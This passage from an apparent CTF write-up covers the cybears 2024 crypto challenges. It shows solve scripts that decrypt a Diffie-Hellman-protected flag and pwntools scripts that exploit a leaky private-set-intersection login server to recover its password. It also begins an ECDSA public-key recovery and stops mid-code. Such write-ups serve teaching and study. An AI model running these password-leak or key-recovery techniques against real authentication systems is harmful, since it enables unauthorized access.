      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from Crypto.Util.number import long_to_bytes, bytes_to_long
from Crypto.Protocol.KDF import HKDF
import Crypto.Hash.SHA512 as sha512
import Crypto.Cipher.AES as aes

# values
g = 107665309954437515284050955368964848368303288172119448977068684165707548536106035934408882308704533335892101447750709116199826328820028967921540045634698373851938861013761725712688725891129665455073194344098566187055873775659411023106521425479072045658166413360399757570409372209072730576562842193768242314124
p = 154305601419430130125267211117098923915333624355567046250094074039674228187186943601303157833374662739969026864299363336407319080223107540886546467388611809417774875857578639486137855088896821184616399750557477866148643263803196632154429856293530179926011705130915364080130059881980341409627009701357523451267
A = 80354936104370249925868492705190743680652231716704224547570074631753287352078443184923555333860525866848256788314156023903492043171511797029693297228294483818872563765707539175061570839714448005871291987391648926205060807957012526950116361633119573934316064444374124669861697695772912934202842834007697535925
B = 42387482047117421466928118692687568439415997629141048723182072767997284324764640343272008345119819287526375581385721174494274510726524360731480638585425669685247170958054446797249761744238847427213615385731375648168698821769635116850680245545304663686514311913787022427877096835277158288159213482962236809739
enc =  bytes.fromhex(&amp;#39;618fa12c3a6a6956a47a91bec13f9e1fe2d1031ba2f40a42b4f4d1d9757d0195ea6215fd694c2b99cf9a00be97b46791&amp;#39;)

# solve
a = (A * pow(g, -1, p)) % p
s = (a * B) % p

aSessionKey, aIV = HKDF(long_to_bytes(s), 16, b&amp;#39;cybears2024&amp;#39;, sha512, num_keys=2)
a = aes.new(aSessionKey, aes.MODE_CBC, iv=aIV)
flag = a.decrypt(enc)
print(f&amp;#34;{flag = }&amp;#34;)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Flag: &lt;code&gt;cybears{C3rt41nly_ADDS_s0m3_pr0bl3ms}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;psionic---10-solves&#34;&gt;Psionic - 10 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The cybears face a door with a large wooden face carved into it. Surprisingly, the face starts moving and speaking! &amp;ldquo;Speak the password to enter&amp;rdquo; booms the door&amp;hellip; the cybears consider their options..&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc psionic.chal.cybears.io 2323&lt;/code&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;This was a really weird challenge. We are given server code and an instance to connect to:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;648513927&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;648513927&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;server.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
#!/usr/bin/python3

from hashlib import sha1
from Crypto.Util.number import bytes_to_long, long_to_bytes, getRandomInteger, getPrime
import ast
import sys
import json

# This cybears.py file is not included in the handout.
# If you&amp;#39;d like to test locally, create a cybears.py file and put sensible variables in there
from cybears import secret_password, secret_password_chars, flag

# Server-client authentication protocol, but utilising Private-Set-Intersection
# Based on https://csrc.nist.gov/CSRC/media//Projects/pec/documents/stppa-02-PSI-rosulek.pdf

# Client ------------- Server
# 1. {H(p1)^a, H(p2)^a ... } -&amp;gt; 
# 2.               &amp;lt;- {H(s1)^b, H(s2)^b, ..., H(p1)^a^b, H(p2)^a^b... }
# 3. {H(s1)^b^a, H(s2)^b^a, ...} 
# 4. Client checks whether any of the H(s_i)^b^a == H(p_j)^a^b
# 5. Server does same
# 6. If all p_i == s_j, allow client to submit H(nonce || password) for flag! 


def validate_client(client1): 
    result = False
    output = {}

    # parse input 
    try:
        c = ast.literal_eval(client1)
    except Exception as e: 
        print(&amp;#34;Incorrect format - must be a list of integers&amp;#34;)
        return result, output    

    # Check that we have a set
    if type(c) != list: 
        return result, output

    # Check that all elements in the list are integers
    if all(list(map(lambda x: type(x) == int, c))) != True: 
        return result, output

    result = True
    output = c
    return result, output 


if __name__ == &amp;#34;__main__&amp;#34;:

    # Generate ephemeral server public/private keys
    generator = 2
    public_prime = getPrime(1024)
    server_private = getRandomInteger(1024)
    server_public = pow( 2, server_private, public_prime)
    params = { &amp;#34;prime&amp;#34; : public_prime, &amp;#34;generator&amp;#34;: generator, &amp;#34;server_public&amp;#34; : server_public } 
    


    print(&amp;#34;Welcome to the psionic login server!&amp;#34;)
    print(&amp;#34;params = {}&amp;#34;.format(json.dumps(params)))
    print(&amp;#34;Please enter your set of passwords and we will confirm there is a match:&amp;#34;)

    # 1. client to send commitment
    client1 = input() #expect single string of len(password) entries as a list
    
    result, output = validate_client(client1)
    if result == False: 
        print(&amp;#34;Incorrect format - must be a list of integers&amp;#34;)
        sys.exit(-1)
    
    if len(output) != len(secret_password):
        print(&amp;#34;Incorrect length - must same length as password&amp;#34;)
        sys.exit(-1)
        
    # 2. server to send commitment
    server_response1 = list(map(lambda x : pow(x, server_private, public_prime), output))
    server_response2 = list(map(lambda x : pow(bytes_to_long(sha1(x.encode()).digest()), server_private, public_prime), secret_password_chars))
    print(&amp;#34;{}&amp;#34;.format(server_response1 &amp;#43; server_response2))

    # 3. client to send verification
    client2 = input() #expect single string of len(password) entries as a list

    result2, output2 = validate_client(client2)
    if result2 == False:
        print(&amp;#34;Incorrect format - must be a list of integers&amp;#34;)
        sys.exit(-1)

    if len(output2) != len(secret_password):
        print(&amp;#34;Incorrect length - must same length as password&amp;#34;)
        print(&amp;#34;DEBUG: {} / {}&amp;#34;.format( len(output), len(secret_password)))
        sys.exit(-1)

    # 5. Server validation - confirm that { H(p_i)^b^a } == {H(s_i)^a^b}
    # Client could just replay, but we don&amp;#39;t just accept this as proof of knowing the password! 
    print(&amp;#34;checking...&amp;#34;)
    
    if (set(output2) == set(server_response1)): 
        print(&amp;#34;Sets are a match! You must know the password!&amp;#34;) 
        print(&amp;#34;Send it through&amp;#34;) # TODO, hash with a nonce? 
        
        client_password = input()
        if(client_password == secret_password): 
            print(&amp;#34;Correct! Here is your flag: {}&amp;#34;.format(flag))
            sys.exit(0)
        else: 
            print(&amp;#34;Incorrect password&amp;#34;)
            sys.exit(-1)
    else:
        print(&amp;#34;Set mismatch. You don&amp;#39;t know the password!&amp;#34;)
        sys.exit(-1)
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;It&amp;rsquo;s supposedly some sort of &amp;ldquo;Private Set Intersection&amp;rdquo; (PSI), where we need to provide integers (being characters of the password), and it will tell us how many of those are part of the password, and we provide the full password to get the flag.&lt;/p&gt;
&lt;p&gt;Lets step through the server code:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;First, we&amp;rsquo;re provided with some parameters, a prime $p$, generator $g$ and server public value $v = g^y \bmod{p}$ where $y$ is the server private value (These turn out to be useless, so we can kind of just ignore this).&lt;/li&gt;
&lt;li&gt;Next, it prompts us for a list of integers $X = \{x_0, x_1, &amp;hellip;, x_n\}$, and the list must be the same length as the password&lt;/li&gt;
&lt;li&gt;It then loops through the list of integers $X$ and computes $H_X = x_n^y \bmod{p}$ for each item $x_n$ in our list $X$, where H(x) is the SHA1 hash function.&lt;/li&gt;
&lt;li&gt;It does a similar operation for the password chars, computing $H_Z = H(z_n)^y \bmod{p}$ for each character $z_n$ in the password $Z$.&lt;/li&gt;
&lt;li&gt;It sends us both $H_X$ and $H_Z$, which are &amp;ldquo;hidden&amp;rdquo;, hashed values used to compute the private set intersection.&lt;/li&gt;
&lt;li&gt;We are prompted again to provide another list of integers, and the server will check if this list is equal to $H_X$. This step doesn&amp;rsquo;t really make sense since the server sends us $H_X$, so all we have to do is repeat it back.&lt;/li&gt;
&lt;li&gt;If equal, we will be prompted to enter the password as a string, and if the password is correct, we get the flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The code really confused me as I wasn&amp;rsquo;t sure what the challenge was here. I looked at the &lt;a href=&#34;https://csrc.nist.gov/CSRC/media//Projects/pec/documents/stppa-02-PSI-rosulek.pdf&#34;&gt;link provided in the code&lt;/a&gt; which was an overview on Private Set Intersection, and saw that just hashing elements of the set was bad for PSI.&lt;/p&gt;

  &lt;img src=&#34;./img/bad_psi.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 70%&#34;  /&gt;


&lt;p&gt;This is because the point of a private set intersection is for two parties, each with their own private set of data, to compute the intersection between the two sets, &lt;strong&gt;without&lt;/strong&gt; either party learning about the whole private set of the other.&lt;/p&gt;
&lt;p&gt;One (bad) way to do this is for you to hash all elements of your set, and the other party does the same. Then you can compare hashed elements - as identical elements hash to the same digest, you can perform PSI by computing the intersection between sets containing the hashed elements. But the link mentions this is a bad way to do it, because you can use a dictionary attack, hashing all possible values of elements in the set, and comparing it to the hash digest of the other party, learning about their elements if hash digests match.&lt;/p&gt;
&lt;p&gt;However, the server seems to mitigate this - recall that our &amp;ldquo;hidden&amp;rdquo; set is $H_X = x_n^y \bmod{p}$, and we don&amp;rsquo;t know the server private value $y$, so we cannot compute this ourselves. But almost the same method is used to generate the password, $H_Z = H(z_n)^y \bmod{p}$, and the server sends us both these sets. Therefore, we can send $X = \{H(&amp;ldquo;a&amp;rdquo;), H(&amp;ldquo;b&amp;rdquo;), &amp;hellip;\}$ and the server will compute $H_X = x_n^y \bmod{p}$ which will be $\{H(&amp;ldquo;a&amp;rdquo;)^y, H(&amp;ldquo;b&amp;rdquo;)^y, &amp;hellip;\}$, and we can compute this set to the password set which will be $\{H(z_0)^y, H(z_1)^y, &amp;hellip;, H(z_n)^y\}$ and intersect these two sets. An element in both these sets reveals a character of the password.&lt;/p&gt;
&lt;p&gt;The server imports the secret password and password chars:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# This cybears.py file is not included in the handout.&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# If you&amp;#39;d like to test locally, create a cybears.py file and put sensible variables in there&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; cybears &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; secret_password, secret_password_chars, flag
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;I assumed &lt;code&gt;cybears.py&lt;/code&gt; would look something like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;secret_password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1234567890!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;secret_password_chars &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(secret_password)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cybears&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{testing}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;But after my solve script worked local but not on remote, I asked the challenge author if &lt;code&gt;secret_password&lt;/code&gt; and &lt;code&gt;secret_password_chars&lt;/code&gt; were constnat on the server. As it turns out, while &lt;code&gt;secret_password&lt;/code&gt; is constant, &lt;code&gt;secret_password_chars&lt;/code&gt; is not - it&amp;rsquo;s scrambled! Which means &lt;code&gt;cybears.py&lt;/code&gt; probably looks something like this:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;secret_password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1234567890!&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;secret_password_chars &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;shuffle(list(secret_password))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cybears&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{testing}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Knowing this, I came up with the solution:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Brute force a little bit to get the password length (server will error if provided integer list not same length as password), which turned out to be 11&lt;/li&gt;
&lt;li&gt;Check what characters were in the password, by sending integers from 0 to 255, 11 at a time, and intersecting the sets returned from the server. Technically, the sets returned by the server were lists, so we can note the indexes of elements that intersected to know which character is in the password.&lt;/li&gt;
&lt;li&gt;Attempt to unscramble the characters to form a password, such as by using an anagram solver.&lt;/li&gt;
&lt;li&gt;Submit password and get the flag.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I found it really weird that I had to unscramble the password, it didn&amp;rsquo;t seem to make sense that &lt;code&gt;secret_password_chars&lt;/code&gt; was scrambled, as otherwise, you could easily correlate the indexes of intersecting elements to know what character is in what position. My best guess for why it was scrambled would be that the challenge author wanted to simulate the unordered nature of sets. If anyone knows why, please let me know!&lt;/p&gt;
&lt;p&gt;After running a script to get all the chars, we get characters &lt;code&gt;[&#39;!&#39;, &#39;1&#39;, &#39;A&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;l&#39;, &#39;m&#39;, &#39;o&#39;, &#39;r&#39;, &#39;t&#39;]&lt;/code&gt;. Convering some from l33t c0d3 and putting it in an anagram solver, we get &lt;code&gt;Algorithm&lt;/code&gt; as a potential word. Then we can start to guess passwords, and the correct one turns out to be &lt;code&gt;Algorithm1!&lt;/code&gt;, which gets us the flag.&lt;/p&gt;
&lt;p&gt;Solve scripts:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;387196452&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;387196452&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;get_pw_chars.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from pwn import *
from Crypto.Util.number import *
import json
import string
from hashlib import sha1

pw_chars = []

step = 11
for i in range(0, 256, step):
    r = remote(&amp;#34;psionic.chal.cybears.io&amp;#34;, 2323)
    # r = remote(&amp;#34;localhost&amp;#34;, 1111)

    r.recvline()
    r.recvuntil(b&amp;#34;params = &amp;#34;)
    params = json.loads(r.recvline().strip().decode()) # unused
    r.recvuntil(b&amp;#34; match:&amp;#34;)
    
    arr_raw = [chr(v) for v in range(i, i&amp;#43;step)]
    arr = [bytes_to_long(sha1(v.encode()).digest()) for v in arr_raw]

    r.sendline(str(arr).encode())
    r.recvline()

    resp = eval(r.recvline().strip().decode())
    H_X, H_Y = resp[:11], resp[11:]

    for xi, x in enumerate(H_X):
        for yi, y in enumerate(H_Y):
            if x == y:
                pw_chars.append(arr_raw[xi])

print(f&amp;#34;{pw_chars = }&amp;#34;)

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;162489573&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;162489573&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;get_flag.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
from pwn import *
from Crypto.Util.number import *
import json
import string
from hashlib import sha1

pw_chars = []
r = remote(&amp;#34;psionic.chal.cybears.io&amp;#34;, 2323)
# r = remote(&amp;#34;localhost&amp;#34;, 1111)

r.recvline()
r.recvuntil(b&amp;#34;params = &amp;#34;)
params = json.loads(r.recvline().strip().decode()) # unused
r.recvuntil(b&amp;#34; match:&amp;#34;)

arr_raw = [chr(v) for v in range(0, 11)]
arr = [bytes_to_long(sha1(v.encode()).digest()) for v in arr_raw]

r.sendline(str(arr).encode())
r.recvline()

resp = eval(r.recvline().strip().decode())
H_X, H_Y = resp[:11], resp[11:]

r.sendline(str(H_X).encode())

r.sendline(b&amp;#34;Algorithm1!&amp;#34;)
r.interactive()

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;Flag: &lt;code&gt;cybears{n0t_s0_pr1v@t3_int3rs3ct10n}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This was a unique challenge, different to most crypto chals, but I didn&amp;rsquo;t really like having to guess the password from a set of characters - I thought that was a bit guessy and I was lucky to have guessed it.&lt;/p&gt;
&lt;h1 id=&#34;public-service---8-solves&#34;&gt;Public Service - 8 solves&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;You find a parchment filled with ancient writings. At the bottom are a number of ornate calligraphic signatures&amp;hellip;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;This was a nice challenge. We&amp;rsquo;re given two files, &lt;code&gt;generate_signatures.py&lt;/code&gt; and &lt;code&gt;out.json&lt;/code&gt;:&lt;/p&gt;



  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;948327156&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;948327156&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;python&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;generate_signatures.py&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-python&#34; &gt;&lt;code&gt;
import Crypto.Signature.DSS as dss
import Crypto.PublicKey.ECC as ecc
import Crypto.Hash.SHA256 as sha256
import Crypto.PublicKey.RSA as rsa
import Crypto.Signature.PKCS1_v1_5 as pkcs
import Crypto.Cipher.PKCS1_OAEP as oaep
from Crypto.Util.number import inverse, getPrime, isPrime, long_to_bytes, bytes_to_long
from binascii import hexlify
import json

from cybearssecrets import FLAG

MESSAGE1 = b&amp;#39;If a new source of energy is not found, no one is going to win this war&amp;#39;
MESSAGE2 = b&amp;#39;Bah weep gragnah weep nini bong&amp;#39;
MESSAGE3 = b&amp;#39;Freedom is the right of all sentient beings&amp;#39;

## Generate Elliptic Curve parameters
ec = ecc.generate(curve = &amp;#34;p256&amp;#34;)
ec_signer = dss.new(ec, &amp;#39;fips-186-3&amp;#39;)

## Generate Elliptic Curve Signature
ec_hasher = sha256.new(MESSAGE1)
ec_sig = ec_signer.sign(ec_hasher)

## Generate RSA parameters
def generate_special_prime(b):
    t = bytes_to_long(b)
    while not(isPrime(t)):
        t &amp;#43;= 1
    return t

rsa_p = generate_special_prime(long_to_bytes(ec.pointQ.x)&amp;#43;long_to_bytes(ec.pointQ.y))
rsa_q = getPrime(512) 

rsa_n = rsa_p*rsa_q
rsa_e = 65537
rsa_d = inverse(rsa_e, (rsa_p-1)*(rsa_q-1))

r = rsa.construct((rsa_n,rsa_e,rsa_d))

## Generate RSA Signatures
rsa_signer = pkcs.new(r)

rsa_hasher1 = sha256.new(MESSAGE2)
rsa_hasher2 = sha256.new(MESSAGE3)

rsa_sig1 = rsa_signer.sign(rsa_hasher1)
rsa_sig2 = rsa_signer.sign(rsa_hasher2)

## Encrypt Flag
encrypter = oaep.new(r)
cipher = encrypter.encrypt(FLAG)

j = {}
j[&amp;#39;ec_sig&amp;#39;] = hexlify(ec_sig).decode()
j[&amp;#39;rsa_sig1&amp;#39;] = hexlify(rsa_sig1).decode()
j[&amp;#39;rsa_sig2&amp;#39;] = hexlify(rsa_sig2).decode()
j[&amp;#39;cipher&amp;#39;] = hexlify(cipher).decode()

with open(&amp;#34;out.json&amp;#34;, &amp;#34;w&amp;#34;) as g: 
    g.write(json.dumps(j))

&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;





  &lt;div class=&#34;collapsable-code&#34;&gt;
    &lt;input id=&#34;268745931&#34; type=&#34;checkbox&#34; checked /&gt;
    &lt;label for=&#34;268745931&#34;&gt;
      &lt;span class=&#34;collapsable-code__language&#34;&gt;json&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__title&#34;&gt;out.json&lt;/span&gt;
      &lt;span class=&#34;collapsable-code__toggle&#34; data-label-expand=&#34;Show&#34; data-label-collapse=&#34;Hide&#34;&gt;&lt;/span&gt;
    &lt;/label&gt;
    &lt;pre class=&#34;language-json&#34; &gt;&lt;code&gt;
{&amp;#34;ec_sig&amp;#34;: &amp;#34;8d32a95ab9b4d92f6ff307d9721451707822d2eae3e07c5c605f0d5979a2e2210b5149487c4d1bedafa96628fcc3579b4842abfa156a963d7db0c15d8da32cc9&amp;#34;, &amp;#34;rsa_sig1&amp;#34;: &amp;#34;45e225f7532b25aa283f80b5166de185cff8b46fb3c9de982083b1ed4a7621c14d0ab541e945c31c9984f958d0b23331d6c636ba8c443941afa277dd2b00c9b7884b4bc9a55047b77305cc6061d9aa9e6be99b70f2f469f6c1accba77228ef129af79bb7f196176753ed27f8308a30b298c34bfc3503dce92f77f0ed8b6d16b6&amp;#34;, &amp;#34;rsa_sig2&amp;#34;: &amp;#34;56b9bac062a9a75b2db42b480e439927265a06b0815be14814f19cd27553a8bdd2815c1814a060fa25b9713b10516b57c9e1f399415492f1ac9a8795034ade99744237a6354d32c0e7330b0b0f52d237e7967863869cf9fdc387f90349c9fbffa15aa72c48ece92bbe59760f41606bfff28af9fdde8f275bf07379f798d98d4d&amp;#34;, &amp;#34;cipher&amp;#34;: &amp;#34;65312f30ef4f34edd32c11ce885c51279bdecd16168953733f04380eb1ed183542e745d630133c4c0c5ce7580bbfb90a347c387eb2743ffaeae5cb7a82058e0fb8a85f7aa392433dc12f0b78e9e0b577909353de84913a47895109de2019a3b88b72f03e13b16f7b092e7a428c664ed174b2cb63208b7a55e9d02a2c0f268d4e&amp;#34;}
&lt;/code&gt;&lt;/pre&gt;
  &lt;/div&gt;


&lt;p&gt;There are 3 known, plaintext messages, $m_1$, $m_2$, and $m_3$. A p256 curve is used and a private key on the curve is generated. Then, a ECDSA signature is created from signing the sha256 hash of $m_1$. We are given this signature.&lt;/p&gt;
&lt;p&gt;Next, a prime $p$ is deterministically generated, using the public key on the curve, point $Q$. Then standard RSA follows, generating prime $q$, public key $n=pq$, and private key $d=e^{-1} \bmod(\phi{(n)})$. Signatures of $m_2$ and $m_3$ are created using the RSA private key, and we are given these signatures. The flag is then encrypted with the RSA key, and we are given the encrypted flag.&lt;/p&gt;
&lt;p&gt;The challenge is to recover both the ECC and RSA public keys, and decrypt the flag.&lt;/p&gt;
&lt;h3 id=&#34;recovering-ecc-public-key&#34;&gt;Recovering ECC Public Key&lt;/h3&gt;
&lt;p&gt;I searched online for recovering the public key from an ECDSA signature and found &lt;a href=&#34;https://crypto.stackexchange.com/questions/18105/how-does-recovering-the-public-key-from-an-ecdsa-signature-work&#34;&gt;this&lt;/a&gt;, which you should read for more details, but essentially you can recover the public key given a signature $(r, s)$, by finding the two points $R$ and $\prime{R}$ with the same x coordinate as $r$, and calculating:&lt;/p&gt;
&lt;p&gt;$$
r^{-1}(sR - zG) \newline
r^{-1}(s\prime{R} - zG)
$$&lt;/p&gt;
&lt;p&gt;where $z$ is the message that was signed, and $G$ is the generator on the curve. As shown above this yields two points, one of which is the public key $Q$.&lt;/p&gt;
&lt;p&gt;We can do so using the sage code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# p-256 curve paramters from https://neuromancer.sk/std/nist/P-256&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;K &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GF(p)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; K(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; K(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;E &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; EllipticCurve(K, (a, b))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;G &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; E(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;E&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;set_order(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;r,s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes_to_long(ec_sig[:&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;]), bytes_to_long(ec_sig[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;:])
